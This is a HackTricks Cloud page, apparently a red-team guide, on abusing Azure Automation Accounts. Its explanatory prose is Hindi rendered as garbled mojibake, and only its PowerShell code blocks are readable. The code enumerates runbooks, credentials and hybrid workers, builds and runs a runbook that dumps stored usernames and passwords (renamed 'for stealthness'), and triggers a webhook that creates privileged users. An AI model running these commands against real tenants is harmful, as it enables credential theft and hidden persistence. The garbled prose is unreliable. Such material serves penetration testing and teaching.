# Az - Automation Account

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/azure/automation/overview) Azure Automation рдПрдХ рдХреНрд▓рд╛рдЙрдб-рдЖрдзрд╛рд░рд┐рдд рдСрдЯреЛрдореЗрд╢рди, рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдЕрдкрдбреЗрдЯ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ Azure рдФрд░ рдЧреИрд░-Azure рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд▓рдЧрд╛рддрд╛рд░ рдкреНрд░рдмрдВрдзрди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдСрдЯреЛрдореЗрд╢рди, рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди, рдЕрдкрдбреЗрдЯ рдкреНрд░рдмрдВрдзрди, рд╕рд╛рдЭрд╛ рдХреНрд╖рдорддрд╛рдПрдБ рдФрд░ рд╡рд┐рд╖рдо рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдпреЗ Azure рдореЗрдВ "**рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп**" рдХреА рддрд░рд╣ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ **рдкреНрд░рдмрдВрдзрд┐рдд**, рдЬрд╛рдВрдЪрдиреЗ рдФрд░ **Azure рд╡рд╛рддрд╛рд╡рд░рдг** рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪреАрдЬреЗрдВ (рдХреНрд░рд┐рдпрд╛рдПрдБ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ) рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗред

### Run As Account

рдЬрдм **Run as Account** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ Azure AD **рдРрдкреНрд▓рд┐рдХреЗрд╢рди** рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрд╡рдпрдВ-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╣реЛрддрд╛ рд╣реИ, рдПрдХ **рд╕реЗрд╡рд╛ рдкреНрд░рдореБрдЦ** рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ **рд╡рд░реНрддрдорд╛рди рд╕рджрд╕реНрдпрддрд╛** рдореЗрдВ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **Contributor** рднреВрдорд┐рдХрд╛ рд╕реМрдВрдкрддрд╛ рд╣реИ (рдХрдИ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░)ред\
Microsoft рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **Managed Identity** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

{% hint style="warning" %}
рдпрд╣ **30 рд╕рд┐рддрдВрдмрд░, 2023 рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ Managed Identities рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЬрд╛рдПрдЧрд╛ред**
{% endhint %}

## Runbooks & Jobs

**Runbooks** рдЖрдкрдХреЛ **рдордирдорд╛рдиреЗ PowerShell** рдХреЛрдб рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ рдПрдХ рд╣рдорд▓рд╛рд╡рд░** рджреНрд╡рд╛рд░рд╛ **рд╕рдВрд▓рдЧреНрди рдкреНрд░рдореБрдЦ** рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ)ред\
**Runbooks** рдХреЗ **рдХреЛрдб** рдореЗрдВ рдЖрдк **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** (рдЬреИрд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕) рднреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк **рдЬреЙрдмреНрд╕** рдХреЛ **рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдРрд╕рд╛ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рд░рди рдХрд╛ **рдЖрдЙрдЯрдкреБрдЯ** **рд░рдЦрддреЗ** рд╣реИрдВ (рд╕рдВрднрд╛рд╡рд┐рдд **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА**).

рдЬрд╛рдПрдБ `Automation Accounts` --> `<Select Automation Account>` --> `Runbooks/Jobs/Hybrid worker groups/Watcher tasks/credentials/variables/certificates/connections`

### Hybrid Worker

рдПрдХ Runbook рдХреЛ **Azure рдХреЗ рдЕрдВрджрд░ рдПрдХ рдХрдВрдЯреЗрдирд░** рдореЗрдВ рдпрд╛ **Hybrid Worker** (рдЧреИрд░-Azure рдорд╢реАрди) рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**Log Analytics Agent** рдХреЛ VM рдкрд░ рддреИрдирд╛рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ рдПрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдЬреЙрдмреНрд╕ **SYSTEM** рдХреЗ рд░реВрдк рдореЗрдВ Windows рдкрд░ рдФрд░ **nxautomation** рдЦрд╛рддреЗ рдХреЗ рд░реВрдк рдореЗрдВ Linux рдкрд░ рдЪрд▓рддреА рд╣реИрдВред\
рдкреНрд░рддреНрдпреЗрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдХреЛ **Hybrid Worker Group** рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк **Windows Hybrid Worker** рдореЗрдВ рдПрдХ **Runbook** рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **System** рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдмрд╛рд╣рд░реА рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ **рдордирдорд╛рдиреЗ рдЖрджреЗрд╢** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВрдЧреЗ (рдЕрдЪреНрдЫреА рдкрд┐рд╡рдЯ рддрдХрдиреАрдХ)ред

## Compromise State Configuration (SC)

[From the docs:](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview) Azure Automation **State Configuration** рдПрдХ Azure рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ PowerShell Desired State Configuration (DSC) [рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) рд▓рд┐рдЦрдиреЗ, рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╕рдВрдХрд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреЛ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЙрдб рдпрд╛ рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕реЗрд╕ рдбреЗрдЯрд╛ рдХреЗрдВрджреНрд░ рдореЗрдВ рдиреЛрдбреНрд╕ рдХреЗ рд▓рд┐рдП рд╣реЛрддреА рд╣реИред рдпрд╣ рд╕реЗрд╡рд╛ [DSC Resources](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources) рдХреЛ рднреА рдЖрдпрд╛рдд рдХрд░рддреА рд╣реИ, рдФрд░ рд▓рдХреНрд╖рд┐рдд рдиреЛрдбреНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реМрдВрдкрддреА рд╣реИ, рд╕рднреА рдХреНрд▓рд╛рдЙрдб рдореЗрдВред рдЖрдк Azure рдкреЛрд░реНрдЯрд▓ рдореЗрдВ **Configuration Management** рдХреЗ рддрд╣рдд **State configuration (DSC)** рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ Azure Automation State Configuration рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### RCE

рдпрд╣ рдкреНрд░рдмрдВрдзрд┐рдд рдорд╢реАрдиреЛрдВ рдореЗрдВ рдордирдорд╛рдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП SC рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## Enumeration

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### рдПрдХ рд░рдирдмреБрдХ рдмрдирд╛рдПрдВ

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### рдПрдХ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдФрд░ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рд░рди рдмреБрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░реЗрдВ

{% code overflow="wrap" %}
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% endcode %}

{% hint style="info" %}
рдЖрдк рдПрдХ рдореМрдЬреВрджрд╛ рд░рди рдмреБрдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ рд╡реЗрдм рдХрдВрд╕реЛрд▓ рд╕реЗ рд╡рд╣реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг рдХреЗ рд▓рд┐рдП рд╕реЗрдЯрдЕрдк рдХреЗ рдЪрд░рдг

#### 1. рдПрдХ рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддрд╛ рдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдВ

* **рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрд░рд╡рд╛рдИ:** рдПрдХ рдирдпрд╛ рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВред
* **рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ:** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ "Create Azure Run As account" рд╕рдХреНрд╖рдо рд╣реИред

#### 2. рд░рдирдмреБрдХ рдЖрдпрд╛рдд рдФрд░ рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВ

* **рд╕реНрд░реЛрдд:** [MicroBurst GitHub Repository](https://github.com/NetSPI/MicroBurst) рд╕реЗ рдирдореВрдирд╛ рд░рдирдмреБрдХ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
* **рдЖрд╡рд╢реНрдпрдХ рдХреНрд░рд┐рдпрд╛рдПрдБ:**
* рд░рдирдмреБрдХ рдХреЛ рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддреЗ рдореЗрдВ рдЖрдпрд╛рдд рдХрд░реЗрдВред
* рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдирдмреБрдХ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВред
* рдмрд╛рд╣рд░реА рдЯреНрд░рд┐рдЧрд░реНрд╕ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдирдмреБрдХ рдореЗрдВ рдПрдХ рд╡реЗрдмрд╣реБрдХ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВред

#### 3. AzureAD рдореЙрдбреНрдпреВрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ

* **рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрд░рд╡рд╛рдИ:** рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддреЗ рдореЗрдВ AzureAD рдореЙрдбреНрдпреВрд▓ рдЬреЛрдбрд╝реЗрдВред
* **рдЕрддрд┐рд░рд┐рдХреНрдд рдХрджрдо:** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╕рднреА Azure Automation рдореЙрдбреНрдпреВрд▓ рдЙрдирдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЕрдкрдбреЗрдЯ рд╣реИрдВред

#### 4. рдЕрдиреБрдорддрд┐ рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ

* **рдЕрд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреВрдорд┐рдХрд╛рдПрдБ:**
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ
* рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдорд╛рд▓рд┐рдХ
* **рд▓рдХреНрд╖реНрдп:** рдЖрд╡рд╢реНрдпрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд▓рд┐рдП рдЗрди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддреЗ рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд░реЗрдВред

#### 5. рд╕рдВрднрд╛рд╡рд┐рдд рдкрд╣реБрдВрдЪ рд╣рд╛рдирд┐ рдХреЗ рдкреНрд░рддрд┐ рдЬрд╛рдЧрд░реВрдХрддрд╛

* **рдиреЛрдЯ:** рдРрд╕реА рд╕реНрд╡рдЪрд╛рд▓рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рд╕реЗ рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдЦреЛрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

#### 6. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ

* рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП POST рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рд╡реЗрдмрд╣реБрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВред
* рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ `$uri` рдХреЛ рдЖрдкрдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╡реЗрдмрд╣реБрдХ URL рд╕реЗ рдмрджрд▓реЗрдВ рдФрд░ `$AccountInfo` рдХреЛ рдЗрдЪреНрдЫрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред
```powershell
$uri = "<YOUR_WEBHOOK_URL>"
$AccountInfo  = @(@{RequestBody=@{Username="<DESIRED_USERNAME>";Password="<DESIRED_PASSWORD>"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```
## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
